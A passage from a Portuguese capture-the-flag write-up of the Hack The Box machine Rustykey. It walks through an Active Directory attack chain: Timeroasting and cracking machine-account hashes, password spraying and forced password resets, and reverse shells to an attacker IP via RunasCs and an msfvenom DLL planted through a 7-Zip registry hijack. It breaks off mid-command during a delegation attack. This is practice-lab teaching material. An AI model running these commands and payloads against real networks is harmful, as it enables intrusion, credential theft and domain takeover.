[{"content":"","date":"9 novembro 2025","externalUrl":null,"permalink":"/CatOverflow/","section":"","summary":"","title":"","type":"page"},{"content":"","date":"9 novembro 2025","externalUrl":null,"permalink":"/CatOverflow/writeups/","section":"Writeups","summary":"","title":"Writeups","type":"writeups"},{"content":"","date":"8 novembro 2025","externalUrl":null,"permalink":"/CatOverflow/tags/hard/","section":"Tags","summary":"","title":"Hard","type":"tags"},{"content":"","date":"8 novembro 2025","externalUrl":null,"permalink":"/CatOverflow/tags/htb/","section":"Tags","summary":"","title":"HTB","type":"tags"},{"content":" Resumo # A Rustykey é uma máquina de nível Hard que contém uma cadeia de ataques interessantes. Iniciamos com um usuário no Active Directory que nos permitiu enumerar o AD completamente, o que nos levou a um ataque de Timeroasting devido a várias contas de máquinas no AD. Após obtermos uma conta privilegiada no AD, conseguimos nos adicionarmos em um grupo que possuia permissão de ForceChangePassword sobre dois usuários. Após obter esses usuários, encontramos um PDF que nos levou a um ataque de DLL hijacking, o que permitiu obter mais um usuário privilegiado. E por fim, abusamos de um RCBD que permitia impersonar qualquer usuário do AD.\nEssa é uma máquina bastante desafiadora e interessante. Ela fornece diversos aprendizados e práticas que encontramos em vários outros CTFs de Active Directory.\nRecon inicial # Como sempre em todo CTF, estarei iniciando o scan de portas na máquina. Estarei utilizando o Rustscan para fazer esse scan rapidamente (você pode utilizar o nmap normalmente caso prefira):\nrustscan -a 10.10.11.75 -u 5000 -- -sV PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack ttl 127 Simple DNS Plus 88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-10-30 02:26:27Z) 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? syn-ack ttl 127 464/tcp open kpasswd5? syn-ack ttl 127 593/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped syn-ack ttl 127 5985/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 9389/tcp open mc-nmf syn-ack ttl 127 .NET Message Framing 47001/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 49664/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49665/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49666/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49667/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49673/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49674/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 49675/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49676/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49677/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49680/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49696/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49730/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows SEMPRE que rodar o Rustscan/Nmap, adicione o domain encontrado no seu arquivo /etc/hosts para não ter problemas de DNS. E SEMPRE que for possível, coloque o dc.DOMINIO.htb ANTES do DOMINIO.htb. Não encontramos nenhuma porta fora do comum em ambientes Windows, então como ja iniciamos com um usuário, irei pular para a enumeração das shares do SMB.\nAo tentar enumerar as shares vemos que a autenticação NTLM está desabilitada no Active Directory (autenticação com senhas), para \u0026ldquo;burlar\u0026rdquo; isso precisamos solicitar um ticket TGT (Ticket Granting Ticket) para conseguir nos autenticar com o Kerberos. Para fazer isso, estarei utilizando o kinit, porém antes disso precisamos configurar o /etc/krb5conf:\n[realms] RUSTYKEY.HTB = { kdc = dc.rustykey.htb } Após essa configuração, podemos solicitar o TGT:\nkinit rr.parker@RUSTYKEY.HTB Para validar se o TGT gerado foi válido, podemos usar o klist:\n\u0026gt; klist Ticket cache: FILE:/tmp/krb5cc_0 Default principal: rr.parker@RUSTYKEY.HTB Valid starting Expires Service principal 10/29/2025 23:38:25 10/30/2025 09:38:25 krbtgt/RUSTYKEY.HTB@RUSTYKEY.HTB renew until 10/30/2025 23:38:21 Sempre que o NTLM do AD estiver desabilitado e precisar utilizar tickets TGT/TGS, SEMPRE UTILIZE O HOST COM DC.DOMINIO.HTB pois o Kerberos só trabalha com DNS! Com esse TGT, podemos finalmente acessar as shares SMB usando o Netexec:\nnxc smb \u0026#34;dc.rustykey.htb\u0026#34; -u \u0026#39;rr.parker\u0026#39; -p \u0026#39;8#t5HE8L!W3A\u0026#39; --shares -k SMB dc.rustykey.htb 445 dc [*] x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False) SMB dc.rustykey.htb 445 dc [-] rustykey.htb\\rr.parker:8#t5HE8L!W3A KRB_AP_ERR_SKEW Porém nos deparamos com o erro KRB_AP_ERR_SKEW, esse erro sempre acontece quando o horário da sua máquina está diferente do horário do Kerberos. Tem várias maneiras de corrigir isso, no meu caso estarei usando o Faketime:\nfaketime \u0026#34;$(rdate -n $DC_IP -p | awk \u0026#39;{print $2, $3, $4}\u0026#39; | date -f - \u0026#34;+%Y-%m-%d %H:%M:%S\u0026#34;)\u0026#34; zsh O Faketime irá sincronizar apenas o horário da shell atual com o horário do Kerberos. Com o horário sincronizado, podemos usar novamente o Netexec:\nnxc smb \u0026#34;dc.rustykey.htb\u0026#34; -u \u0026#39;rr.parker\u0026#39; -p \u0026#39;8#t5HE8L!W3A\u0026#39; --shares -k SMB dc.rustykey.htb 445 dc [*] x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False) SMB dc.rustykey.htb 445 dc [+] rustykey.htb\\rr.parker:8#t5HE8L!W3A SMB dc.rustykey.htb 445 dc [*] Enumerated shares SMB dc.rustykey.htb 445 dc Share Permissions Remark SMB dc.rustykey.htb 445 dc ----- ----------- ------ SMB dc.rustykey.htb 445 dc ADMIN$ Remote Admin SMB dc.rustykey.htb 445 dc C$ Default share SMB dc.rustykey.htb 445 dc IPC$ READ Remote IPC SMB dc.rustykey.htb 445 dc NETLOGON READ Logon server share SMB dc.rustykey.htb 445 dc SYSVOL READ Logon server share Porém não encontramos nada interessante nas shares. Irei partir pra enumeração do AD, estarei usando o bloodhound-python para fazer a enumeração e gerar o zip:\nbloodhound-python -d rustykey.htb -ns 10.10.11.75 -u rr.parker -p \u0026#39;8#t5HE8L!W3A\u0026#39; -k -c ALL --zip INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3) INFO: Found AD domain: rustykey.htb INFO: Using TGT from cache INFO: Found TGT with correct principal in ccache file. INFO: Connecting to LDAP server: dc.rustykey.htb INFO: Found 1 domains INFO: Found 1 domains in the forest INFO: Found 16 computers INFO: Connecting to LDAP server: dc.rustykey.htb INFO: Found 12 users INFO: Found 58 groups INFO: Found 2 gpos INFO: Found 10 ous INFO: Found 19 containers INFO: Found 0 trusts INFO: Starting computer enumeration with 10 workers INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: dc.rustykey.htb INFO: Done in 00M 31S INFO: Compressing output into 20251030000528_bloodhound.zip Com o zip gerado, estarei utilizando o Bloodhound-legacy para \u0026ldquo;digerir\u0026rdquo; esse dump e gerar o gráfico visual.\nAnalisando o Active Directory # Realizando um Timeroasting para obter o IT-Computer3$ # Após algum tempo analisando o AD, não encontramos nada interessante a não ser as várias contas de computadores:\nO que levanta a hipótese de um ataque de Timeroasting. Utilizando o script do mesmo site, conseguimos as seguintes hashs:\n1000:$sntp-ms$3fc8b5cffc215f72ebd3b779696baac5$1c0111e900000000000a65e24c4f434cecacd516799587bce1b8428bffbfcd0aecad5b68059da4c1ecad5b68059dc64f 1103:$sntp-ms$de79e918feba6ba77ad3ad58cd01cb37$1c0111e900000000000a65e24c4f434cecacd51679b332c7e1b8428bffbfcd0aecad5b68c5bb4c71ecad5b68c5bb6fad 1104:$sntp-ms$938aee049b64154e27f64bd3f52791e2$1c0111e900000000000a65e24c4f434cecacd5167b9f82e7e1b8428bffbfcd0aecad5b68c7a7942eecad5b68c7a7bfcd 1105:$sntp-ms$11c48527a1939d4b088d2456eb6ae77e$1c0111e900000000000a65e24c4f434cecacd516788d0d9ae1b8428bffbfcd0aecad5b68c8adb90becad5b68c8adddf4 1106:$sntp-ms$da784792e6ea12d62ebc509c03cd62a7$1c0111e900000000000a65e24c4f434cecacd5167ab5ef3ae1b8428bffbfcd0aecad5b68cad69750ecad5b68cad6c142 1107:$sntp-ms$ebd52e1657ffafb6b8da3f8277b9519c$1c0111e900000000000a65e24c4f434cecacd5167c5e8922e1b8428bffbfcd0aecad5b68cc7f3641ecad5b68cc7f597c 1118:$sntp-ms$6170b4f9ad2199ecb6e1815a54f2db34$1c0111e900000000000a65e24c4f434cecacd5167be30f2ee1b8428bffbfcd0aecad5b68e41421f5ecad5b68e41441d6 1119:$sntp-ms$75010daf1dd74db151f1af431798d79d$1c0111e900000000000a65e24c4f434cecacd5167972bcb5e1b8428bffbfcd0aecad5b68e57ad304ecad5b68e57af99b 1120:$sntp-ms$9635feeb4d92dcdc860e2e1a8a054904$1c0111e900000000000a65e24c4f434cecacd516786f9690e1b8428bffbfcd0aecad5b68e8903643ecad5b68e8906a45 1121:$sntp-ms$77129d188cb7d62d2b8a525db5c146d6$1c0111e900000000000a65e24c4f434cecacd5167a9a5d0de1b8428bffbfcd0aecad5b68eabb01c9ecad5b68eabb2d68 1122:$sntp-ms$496ca062d4994931f60819a8252519a2$1c0111e900000000000a65e24c4f434cecacd5167c405e94e1b8428bffbfcd0aecad5b68ec610350ecad5b68ec61309c 1123:$sntp-ms$ffb4b4ab380b72116688ef5342171b95$1c0111e900000000000a65e24c4f434cecacd51679f24be2e1b8428bffbfcd0aecad5b68edea04ebecad5b68edea2679 1124:$sntp-ms$1a54335d4224cf81a14b311a6836109f$1c0111e900000000000a65e24c4f434cecacd51679f32957e1b8428bffbfcd0aecad5b68edeae0b4ecad5b68edeb059c 1125:$sntp-ms$c96cc1fb895b1b093050b46858d0d1b4$1c0111e900000000000a65e24c4f434cecacd51678811b1de1b8428bffbfcd0aecad5b68f0916949ecad5b68f0918929 1126:$sntp-ms$3f1007a180067d7601177870178d3330$1c0111e900000000000a65e24c4f434cecacd51678e9721fe1b8428bffbfcd0aecad5b68f0f9c1f8ecad5b68f0f9e02b 1127:$sntp-ms$e29320686d737b188991617f060c6272$1c0111e900000000000a65e24c4f434cecacd5167905a052e1b8428bffbfcd0aecad5b68f115ee7eecad5b68f1160e5f Com elas, conseguimos brutar as hashs localmente usando o John ou o Hashcat e obter a seguinte senha:\njohn --wordlist=\u0026#34;/usr/share/wordlists/rockyou\u0026#34; hashs Using default input encoding: UTF-8 Loaded 16 password hashes with 16 different salts (timeroast, SNTP-MS [MD4+MD5 32/64]) Will run 4 OpenMP threads Note: Passwords longer than 9 [worst case UTF-8] to 27 [ASCII] rejected Press \u0026#39;q\u0026#39; or Ctrl-C to abort, \u0026#39;h\u0026#39; for help, almost any other key for status Rusty88! (1125) 1g 0:00:00:19 DONE (2025-10-29 16:37) 0.05020g/s 719771p/s 11332Kc/s 11332KC/s !143u143..*7¡Vamos! Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. Nesse ponto, temos uma senha sem saber de qual usuário é. Como o ataque de Timeroasting é focado em contas de computadores, irei fazer um spray com as contas de máquinas. Pra isso estarei usando o Netexec para separar os nomes e para fazer o spray de senha:\nnxc ldap \u0026#34;dc.rustykey.htb\u0026#34; -u \u0026#39;rr.parker\u0026#39; -p \u0026#39;8#t5HE8L!W3A\u0026#39; -k --computers | awk \u0026#39;{print $5}\u0026#39; DC$ Support-Computer1$ Support-Computer2$ Support-Computer3$ Support-Computer4$ Support-Computer5$ Finance-Computer1$ Finance-Computer2$ Finance-Computer3$ Finance-Computer4$ Finance-Computer5$ IT-Computer1$ IT-Computer2$ IT-Computer3$ IT-Computer4$ IT-Computer5$ Fazendo o spray, descobrimos que a senha que encontramos é do IT-Computer3$:\nnxc ldap \u0026#34;dc.rustykey.htb\u0026#34; -u computers -p \u0026#39;Rusty88!\u0026#39; -k LDAP dc.rustykey.htb 389 DC [*] None (name:DC) (domain:rustykey.htb) LDAP dc.rustykey.htb 389 DC [-] rustykey.htb\\Support-Computer1$:Rusty88! KDC_ERR_PREAUTH_FAILED LDAP dc.rustykey.htb 389 DC [-] rustykey.htb\\Support-Computer2$:Rusty88! KDC_ERR_PREAUTH_FAILED LDAP dc.rustykey.htb 389 DC [-] rustykey.htb\\Support-Computer3$:Rusty88! KDC_ERR_PREAUTH_FAILED LDAP dc.rustykey.htb 389 DC [-] rustykey.htb\\Support-Computer4$:Rusty88! KDC_ERR_PREAUTH_FAILED LDAP dc.rustykey.htb 389 DC [-] rustykey.htb\\Support-Computer5$:Rusty88! KDC_ERR_PREAUTH_FAILED LDAP dc.rustykey.htb 389 DC [-] rustykey.htb\\Finance-Computer1$:Rusty88! KDC_ERR_PREAUTH_FAILED LDAP dc.rustykey.htb 389 DC [-] rustykey.htb\\Finance-Computer2$:Rusty88! KDC_ERR_PREAUTH_FAILED LDAP dc.rustykey.htb 389 DC [-] rustykey.htb\\Finance-Computer3$:Rusty88! KDC_ERR_PREAUTH_FAILED LDAP dc.rustykey.htb 389 DC [-] rustykey.htb\\Finance-Computer4$:Rusty88! KDC_ERR_PREAUTH_FAILED LDAP dc.rustykey.htb 389 DC [-] rustykey.htb\\Finance-Computer5$:Rusty88! KDC_ERR_PREAUTH_FAILED LDAP dc.rustykey.htb 389 DC [-] rustykey.htb\\IT-Computer1$:Rusty88! KDC_ERR_PREAUTH_FAILED LDAP dc.rustykey.htb 389 DC [-] rustykey.htb\\IT-Computer2$:Rusty88! KDC_ERR_PREAUTH_FAILED LDAP dc.rustykey.htb 389 DC [+] rustykey.htb\\IT-Computer3$:Rusty88! E diferente do RR.PARKER, com esse usuário precisamos usar o getTGT do Impacket para solicitar o ticket TGT:\ngetTGT.py -dc-ip \u0026#34;dc.rustykey.htb\u0026#34; rustykey.htb/\u0026#34;IT-Computer3$\u0026#34;:\u0026#39;Rusty88!\u0026#39; Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies [*] Saving ticket in IT-Computer3$.ccache Com o TGT do IT-Computer3$, abrimos um novo leque de ataques que podemos fazer.\nUser Flag # Realizando um ForceChangePassword para obter o BB.MORGAN # O nosso usuário tem permissão de AddSelf no grupo HelpDesk e, consequentemente ForceChangePassword nos usuários DD.ALI, GG.ANDERSON, EE.REED e BB.MORGAN, porém os mais interessantes aqui são o EE.REED e o BB.MORGAN pois eles são membros do grupo REMOTE MANAGEMENT USERS, o que permite acesso remoto com Evil-Winrm.\nEntão o nosso foco será o BB.MORGAN. Para isso primeiro temos que nos adicionarmos no grupo HelpDesk, estarei utilizando o BloodyAD para manipular o AD remotamente (caso queira uma \u0026ldquo;colinha\u0026rdquo; de comandos do BloodyAD, confira esse site):\nKRB5CCNAME=\u0026#39;IT-Computer3$.ccache\u0026#39; bloodyAD --host \u0026#34;dc.rustykey.htb\u0026#34; -d \u0026#34;rustykey.htb\u0026#34; -k add groupMember \u0026#34;HelpDesk\u0026#34; \u0026#39;it-computer3$\u0026#39; [+] it-computer3$ added to HelpDesk Agora que estamos no grupo, precisamos pedir novamente um TGT para atualizar as nossas permissões e ai podemos alterar a senha do BB.MORGAN usando também o BloodyAD. Porém ao tentar mudar a senha, nos deparamos com esse erro:\nKRB5CCNAME=\u0026#39;IT-Computer3$.ccache\u0026#39; bloodyAD --host \u0026#34;dc.rustykey.htb\u0026#34; -d \u0026#34;rustykey.htb\u0026#34; -k set password \u0026#39;bb.morgan\u0026#39; \u0026#39;Password123!\u0026#39; Traceback (most recent call last): File \u0026#34;/root/.local/bin/bloodyAD\u0026#34;, line 8, in \u0026lt;module\u0026gt; sys.exit(main()) ^^^^^^ File \u0026#34;/root/.local/share/pipx/venvs/bloodyad/lib/python3.11/site-packages/bloodyAD/main.py\u0026#34;, line 210, in main output = args.func(conn, **params) ^^^^^^^^^^^^^^^^^^^^^^^^^ File \u0026#34;/root/.local/share/pipx/venvs/bloodyad/lib/python3.11/site-packages/bloodyAD/cli_modules/set.py\u0026#34;, line 241, in password raise e File \u0026#34;/root/.local/share/pipx/venvs/bloodyad/lib/python3.11/site-packages/bloodyAD/cli_modules/set.py\u0026#34;, line 86, in password conn.ldap.bloodymodify(target, {\u0026#34;unicodePwd\u0026#34;: op_list}) File \u0026#34;/root/.local/share/pipx/venvs/bloodyad/lib/python3.11/site-packages/bloodyAD/network/ldap.py\u0026#34;, line 301, in bloodymodify raise err msldap.commons.exceptions.LDAPModifyException: Password can\u0026#39;t be changed. It may be because the oldpass provided is not valid. You can try to use another password change protocol such as smbpasswd, server error may be more explicit. Você deve estar se perguntando: \u0026ldquo;Mas por que acontece isso mesmo tendo a permissão ForceChangePassword?\u0026rdquo; Eu te respondo: isso ocorre porque o BB.MORGAN faz parte do grupo Protected Objects, e tudo que estiver dentro desse grupo, segundo a Microsoft:\nProtected accounts and groups are special objects where permissions are set and enforced via an automatic process that ensures the permissions on the objects remain consistent. These permissions remain even if you move the objects to different locations in Active Directory. If a protected object\u0026rsquo;s permissions are modified, existing processes ensure that permissions are returned to their defaults quickly.\nResumidamente, são objetos importantes que não podem ser alterados facilmente, então para alterarmos a senha do BB.MORGAN precisamos tirar ele desse grupo. E para isso, o BloodyAD nos ajudará novamente:\nKRB5CCNAME=\u0026#39;IT-Computer3$.ccache\u0026#39; bloodyAD --host \u0026#34;dc.rustykey.htb\u0026#34; -d \u0026#34;rustykey.htb\u0026#34; -k remove groupMember \u0026#34;CN=Protected Objects,CN=Users,DC=rustykey,DC=htb\u0026#34; \u0026#34;CN=IT,CN=Users,DC=rustykey,DC=htb\u0026#34; [-] CN=Support,CN=Users,DC=rustykey,DC=htb removed from CN=Protected Objects,CN=Users,DC=rustykey,DC=htb Nesse caso é sempre bom utilizar o distinguishedname do objeto no AD para não ter problema de encontrar o objeto. Caso não funcione, tente se adicionar no grupo novamente pois o cronjob da máquina pode ter removido. Agora ao mudarmos a senha do BB.MORGAN, recebemos a seguinte confirmação:\nKRB5CCNAME=\u0026#39;IT-Computer3$.ccache\u0026#39; bloodyAD --host \u0026#34;dc.rustykey.htb\u0026#34; -d \u0026#34;rustykey.htb\u0026#34; -k set password \u0026#39;bb.morgan\u0026#39; \u0026#39;Piroquinha123!\u0026#39; [+] Password changed successfully! E agora é só pedirmos o TGT do BB.MORGAN e logar no Evil-Winrm:\n\u0026gt; getTGT.py -dc-ip \u0026#34;dc.rustykey.htb\u0026#34; rustykey.htb/\u0026#34;bb.morgan\u0026#34;:\u0026#39;Piroquinha123!\u0026#39; Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies [*] Saving ticket in bb.morgan.ccache ---------------------------------------------- \u0026gt; export KRB5CCNAME=bb.morgan.ccache ---------------------------------------------- \u0026gt; evil-winrm -r RUSTYKEY.HTB -i dc.rustykey.htb Evil-WinRM shell v3.7 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\bb.morgan\\Documents\u0026gt; Root Flag # Encontrando o DLL hijacking # No desktop do BB.MORGAN, vemos um arquivo chamado internal.pdf e analisando ele, vemos a seguinte mensagem:\nInternal Memo\nFrom: bb.morgan@rustykey.htb\nTo: support-team@rustykey.htb\nSubject: Support Group - Archiving Tool Access\nDate: Mon, 10 Mar 2025 14:35:18 +0100\nHey team,\nAs part of the new Support utilities rollout, extended access has been temporarily granted to allow testing and troubleshooting of file archiving features across shared workstations.\nThis is mainly to help streamline ticket resolution related to extraction/compression issues reported by the Finance and IT teams. Some newer systems handle context menu actions differently, so registry-level adjustments are expected during this phase.\nA few notes:\nPlease avoid making unrelated changes to system components while this access is active. This permission change is logged and will be rolled back once the archiving utility is confirmed stable in all environments. Let DevOps know if you encounter access errors or missing shell actions. Thanks, BB Morgan IT Department Analisando esse documento, temos algumas pistas:\n“extended access has been temporarily granted to allow testing and troubleshooting of file archiving features.” -\u0026gt; o grupo Support recebeu permissões ampliadas temporariamente para testar funcionalidades de compressão/extração de arquivos.\n\u0026ldquo;Some newer systems handle context menu actions differently, so registry-level adjustments are expected during this phase.\u0026rdquo; -\u0026gt; O PDF menciona ajustes no registro relacionados ao menu de contexto.\n“Please avoid making unrelated changes to system components while this access is active.” -\u0026gt; Indica que alterações estão sendo feitas apenas em componentes de terceiros.\nTendo isso em mente e vasculhando a máquina, vemos que ela tem o 7-zip instalado, então buscando por valores de registros relacionados a zip, encontramos os seguintes valores:\nreg query \u0026#34;HKLM\\SOFTWARE\\Classes\\CLSID\u0026#34; /s /f \u0026#34;zip\u0026#34; HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{23170F69-40C1-278A-1000-000100020000} (Default) REG_SZ 7-Zip Shell Extension HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{23170F69-40C1-278A-1000-000100020000}\\InprocServer32 (Default) REG_SZ C:\\Program Files\\7-Zip\\7-zip.dll HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{888DCA60-FC0A-11CF-8F0F-00C04FD7D062} (Default) REG_SZ Compressed (zipped) Folder SendTo Target FriendlyTypeName REG_EXPAND_SZ @%SystemRoot%\\system32\\zipfldr.dll,-10226 HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{888DCA60-FC0A-11CF-8F0F-00C04FD7D062}\\DefaultIcon (Default) REG_EXPAND_SZ %SystemRoot%\\system32\\zipfldr.dll HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{888DCA60-FC0A-11CF-8F0F-00C04FD7D062}\\InProcServer32 (Default) REG_EXPAND_SZ %SystemRoot%\\system32\\zipfldr.dll HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{b8cdcb65-b1bf-4b42-9428-1dfdb7ee92af} (Default) REG_SZ Compressed (zipped) Folder Context Menu HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{b8cdcb65-b1bf-4b42-9428-1dfdb7ee92af}\\InProcServer32 (Default) REG_EXPAND_SZ %SystemRoot%\\system32\\zipfldr.dll HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{BD472F60-27FA-11cf-B8B4-444553540000} (Default) REG_SZ Compressed (zipped) Folder Right Drag Handler HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{BD472F60-27FA-11cf-B8B4-444553540000}\\InProcServer32 (Default) REG_EXPAND_SZ %SystemRoot%\\system32\\zipfldr.dll HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{E88DCCE0-B7B3-11d1-A9F0-00AA0060FA31}\\DefaultIcon (Default) REG_EXPAND_SZ %SystemRoot%\\system32\\zipfldr.dll HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{E88DCCE0-B7B3-11d1-A9F0-00AA0060FA31}\\InProcServer32 (Default) REG_EXPAND_SZ %SystemRoot%\\system32\\zipfldr.dll HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{ed9d80b9-d157-457b-9192-0e7280313bf0} (Default) REG_SZ Compressed (zipped) Folder DropHandler HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{ed9d80b9-d157-457b-9192-0e7280313bf0}\\InProcServer32 (Default) REG_EXPAND_SZ %SystemRoot%\\system32\\zipfldr.dll End of search: 14 match(es) found. E olhando mais a fundo o valor da DLL, vemos que o grupo Support tem permissão de edição dessa chave:\nGet-Acl \u0026#34;HKLM:\\SOFTWARE\\Classes\\CLSID\\{23170F69-40C1-278A-1000-000100020000}\\InprocServer32\u0026#34; | Format-list Path : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{23170F69-40C1-278A-1000-000100020000}\\InprocServer32 Owner : BUILTIN\\Administrators Group : RUSTYKEY\\Domain Users Access : APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES Allow ReadKey BUILTIN\\Administrators Allow FullControl CREATOR OWNER Allow FullControl RUSTYKEY\\Support Allow FullControl \u0026lt;---- NT AUTHORITY\\SYSTEM Allow FullControl BUILTIN\\Administrators Allow FullControl BUILTIN\\Users Allow ReadKey Audit : Sddl : O:BAG:DUD:AI(A;CIID;KR;;;AC)(A;ID;KA;;;BA)(A;CIIOID;KA;;;CO)(A;CIID;KA;;;S-1-5-21-3316070415-896458127-4139322052-1132)(A;CIID;KA;;;SY)(A;CIIOID;KA;;;BA)(A;CIID;KR;;;BU) Obtendo o EE.REED # Voltando para o Bloodhound, vemos que também temos a permissão de ForceChangePassword no usuário EE.REED e que ele faz parte do grupo Support:\nEntão do mesmo jeito que mudamos a senha do BB.MORGAN, iremos mudar também a do EE.REED:\nKRB5CCNAME=\u0026#39;IT-Computer3$.ccache\u0026#39; bloodyAD --host \u0026#34;dc.rustykey.htb\u0026#34; -d \u0026#34;rustykey.htb\u0026#34; -k set password \u0026#39;ee.reed\u0026#39; \u0026#39;Piroquinha123!\u0026#39; [+] Password changed successfully! Porém ao tentar solicitar um TGT do EE.REED recebemos o seguinte erro:\ngetTGT.py -dc-ip \u0026#34;dc.rustykey.htb\u0026#34; rustykey.htb/\u0026#34;ee.reed\u0026#34;:\u0026#39;Piroquinha123!\u0026#39; Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies Kerberos SessionError: KDC_ERR_ETYPE_NOSUPP(KDC has no support for encryption type) Então teremos que pegar shell de outra maneira. Estarei utilizando o RunasCs de dentro da máquina para isso:\n*Evil-WinRM* PS C:\\Users\\bb.morgan\\Documents\u0026gt; ./runas.exe ee.reed \u0026#39;Piroquinha123!\u0026#39; powershell -r 10.10.14.228:4444 --force-profile [*] Warning: The logon for user \u0026#39;ee.reed\u0026#39; is limited. Use the flag combination --bypass-uac and --logon-type \u0026#39;8\u0026#39; to obtain a more privileged token. [+] Running in session 0 with process function CreateProcessWithLogonW() [+] Using Station\\Desktop: Service-0x0-2b12c42$\\Default [+] Async process \u0026#39;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\u0026#39; with pid 5404 created in background. rlwrap nc -lvnp 4444 Ncat: Version 7.93 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.75. Ncat: Connection from 10.10.11.75:57195. Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\Windows\\system32\u0026gt; whoami whoami rustykey\\ee.reed Caso você não consiga alterar a senha dele ou iniciar uma reverse shell com o RunasCs, tente remover ele do grupo Protected Objects novamente. Realizando o DLL hijacking para obter o MM.TURNER # Agora que estamos com o usuário e a permissão de editar a DLL que encontramos anteriormente, iremos gerar um payload de reverse shell. Estarei usando o Msfvenom para isso:\nmsfvenom -p windows/x64/powershell_reverse_tcp LHOST=10.10.14.228 LPORT=5555 -f dll -o revshell.dll [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 1867 bytes Final size of dll file: 9216 bytes Saved as: revshell.dll Salvei essa DLL na pasta C:\\Windows\\Tasks\\revshell.dll, agora é só alterar o valor do registro e esperar a shell cair:\nSet-ItemProperty -Path \u0026#34;HKLM:\\SOFTWARE\\Classes\\CLSID\\{23170F69-40C1-278A-1000-000100020000}\\InprocServer32\u0026#34; -Name \u0026#34;(Default)\u0026#34; -Value \u0026#34;C:\\windows\\tasks\\revshell.dll\u0026#34; rlwrap nc -lvnp 5555 Ncat: Version 7.93 ( https://nmap.org/ncat ) Ncat: Listening on :::5555 Ncat: Listening on 0.0.0.0:5555 Ncat: Connection from 10.10.11.75. Ncat: Connection from 10.10.11.75:57212. Windows PowerShell running as user mm.turner on DC Copyright (C) Microsoft Corporation. All rights reserved. whoami rustykey\\mm.turner PS C:\\Windows\u0026gt; Realizando o RCBD para obter o BackupAdmin # Voltando para o Bloodhound e analisando o MM.TURNER, vemos que ele faz parte do grupo DELEGATION MANAGER o que permite adicionarmos a permissão msDS-AllowedToActOnBehalfOfOtherIdentity em contas de serviços.\nAnalisando o nosso cenário atual, ja possuimos a conta de serviço IT-Computer3$, e existe um usuário chamado BackupAdmin no AD que possui a permissão de DCSync. Tendo isso em mente, podemos tentar um ataque de RBCD (Resource-based Constrained Delegation). Esse hacktricks explica detalhadamente esse ataque, mas resumindo aqui: Iremos adicionar uma permissão chamada msDS-AllowedToActOnBehalfOfOtherIdentity no \u0026ldquo;computador\u0026rdquo; DC que permitirá a conta IT-Computer3$ \u0026ldquo;fingir\u0026rdquo; ou \u0026ldquo;fazer\u0026rdquo; coisas no nome do DC, ou seja, iremos impersonar o DC e gerar um TGS no nome do BackupAdmin e rodar DCSync.\nPara realizar esse ataque, irei utilizar os seguintes comandos na shell do MM.TURNER:\nPS C:\\Windows\u0026gt; Set-ADComputer DC -PrincipalsAllowedToDelegateToAccount 